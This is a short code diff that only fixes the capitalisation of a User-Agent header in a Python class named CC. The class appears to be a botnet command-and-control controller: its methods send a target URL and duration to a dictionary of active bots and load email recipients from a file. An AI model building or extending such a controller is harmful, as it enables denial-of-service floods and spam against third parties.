@@ -170,7 +170,7 @@ class CC:
 
     def makeHTTPRequest(self, server, time=1, target=""):
         print("Sending requests...")
-        headers = {'Content-Type': 'application/json', 'User-agent': 'Mozilla/5.0'}
+        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
         data = {"url": server, "time": time}
         if target == "":
             for k, v in self.activeBot.items():
@@ -255,7 +255,7 @@ class CC:
         users = None
         oggetto = None
         messaggio = None
-        headers = {'Content-Type': 'application/json', 'User-agent': 'Mozilla/5.0'}
+        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
 
         try:
             with open("email.json", 'r') as f:
